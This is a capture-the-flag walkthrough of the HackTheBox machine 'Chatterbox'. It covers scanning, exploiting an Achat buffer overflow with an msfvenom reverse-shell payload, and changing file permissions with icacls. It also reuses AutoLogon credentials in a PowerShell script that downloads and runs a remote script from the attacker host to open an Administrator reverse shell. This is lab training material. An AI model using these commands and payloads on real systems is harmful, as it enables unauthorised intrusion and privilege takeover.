# Chatterbox | HackTheBox

### 1. Scan
```bash
┌─[htb-jib1337@htb-kqm1jmc3v1]─[~]
└──╼ $sudo nmap -p- -A -T4 10.129.57.49
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 01:07 UTC
Nmap scan report for 10.129.57.49
Host is up (0.16s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE    VERSION
9255/tcp open  tcpwrapped
9256/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 9256/tcp)
HOP RTT       ADDRESS
1   161.28 ms 10.10.14.1
2   161.43 ms 10.129.57.49

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 440.89 seconds
```
The machine has a couple of open ports. Nmap seems to think it's a phone.

### 2. Enumeration
Doing some research (aka searching "port 9255 port 9256 phone" on Google) on these ports shows that they are used for a few applications, and one called "Achat" has a known exploit. There doesn't seem to be any way to confirm Achat is running on the machine.
```bash
┌─[htb-jib1337@htb-kqm1jmc3v1]─[~]
└──╼ $searchsploit achat
----------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
----------------------------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                               | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                                  | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities                     | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                       | php/webapps/24647.txt
----------------------------------------------------------------------------------------- ---------------------------------
```

### 3. Get a shell
Going to use the python exploit. Generate the payload:
```bash
┌─[✗]─[htb-jib1337@htb-kqm1jmc3v1]─[~/Desktop]
└──╼ $msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.17 LPORT=9999 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 774 (iteration=0)
x86/unicode_mixed chosen with final size 774
Payload size: 774 bytes
Final size of python file: 3767 bytes
```

Fire the exploit with a listener running:
```bash
┌─[htb-jib1337@htb-kqm1jmc3v1]─[~/Desktop]
└──╼ $python2 36025.py 
---->{P00F}!
```

Catch the shell.
```bash
┌─[htb-jib1337@htb-kqm1jmc3v1]─[~/Desktop]
└──╼ $nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.129.54.196 49157
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred
```

### 4. Enumerate from user
Nothing stands out when checking privileges and groups.
```shell
C:\Users\Alfred\Desktop>systeminfo

Host Name:                 CHATTERBOX
OS Name:                   Microsoft Windows 7 Professional 
OS Version:                6.1.7601 Service Pack 1 Build 7601
```
The machine is Windows 7 but it is very well patched. It also turns out that this user does have access to the Admin folder, at least for reading.
```shell
C:\Users\Alfred\Desktop>dir C:\Users\Administrator\Desktop 
 Volume in drive C has no label.
 Volume Serial Number is 9034-6528

 Directory of C:\Users\Administrator\Desktop

12/10/2017  07:50 PM    <DIR>          .
12/10/2017  07:50 PM    <DIR>          ..
07/09/2021  10:04 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  19,484,651,520 bytes free

C:\Users\Alfred\Desktop>type C:\Users\Administrator\Desktop\root.txt
Access is denied.
```
Inspect the directory permissions.
```shell
C:\Users\Alfred\Desktop>icacls C:\Users\Administrator\Desktop 
C:\Users\Administrator\Desktop NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                               CHATTERBOX\Administrator:(I)(OI)(CI)(F)
                               BUILTIN\Administrators:(I)(OI)(CI)(F)
                               CHATTERBOX\Alfred:(I)(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```
It says that I should have full access (F) to this folder.
```shell
C:\Users\Alfred\Desktop>dir /q C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 9034-6528

 Directory of C:\Users\Administrator\Desktop

12/10/2017  07:50 PM    <DIR>          BUILTIN\Administrators .
12/10/2017  07:50 PM    <DIR>          NT AUTHORITY\SYSTEM    ..
07/09/2021  10:04 PM                34 CHATTERBOX\Alfred      root.txt
               1 File(s)             34 bytes
               2 Dir(s)  19,484,672,000 bytes free
```
Plus Alfred actually owns this file.

### 5. Don't escalate, but read the file
Reference: https://ss64.com/nt/icacls.html  
Using icacls, change the file permission to be full access for the Alfred user.
```shell
C:\Users\Administrator\Desktop>icacls root.txt /grant:r Alfred:(F)
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files
```
The root.txt file can then be read.

### Extra
I found out there is actually a way to get to Administrator on this machine by use of autologin credentials which are used for both Administrator and Alfred. They can be found through running a few enum scripts including Winpeas:
```shell
Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultUserName               :  Alfred
    DefaultPassword               :  Welcome1!
```

To spawn new shell as Administrator, copy over a file (see run.ps1), which loads the credentials, then fetches and executes a reverse shell script (called run2.ps1) under the Admin user.  
```powershell
$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('administrator', $passwd)

$runthis = "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.17:8000/run2.ps1')"

Start-Process -FilePath "powershell" -argumentlist $runthis -Credential $creds -WorkingDirectory 'C:\Windows\system32'
```

A HTTP server is started to serve the files.
```bash
┌─[htb-jib1337@htb-kqm1jmc3v1]─[~/Desktop]
└──╼ $python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Execute the script in memory.
```shell
C:\Users\Alfred\Desktop>powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.17:8000/run.ps1')"
```

The shell opens in the listener.
```bash
┌─[htb-jib1337@htb-kqm1jmc3v1]─[~/Desktop]
└──╼ $nc -lvnp 9998
Listening on 0.0.0.0 9998
Connection received on 10.129.171.226 49175

PS C:\Windows\system32> whoami 
chatterbox\administrator
```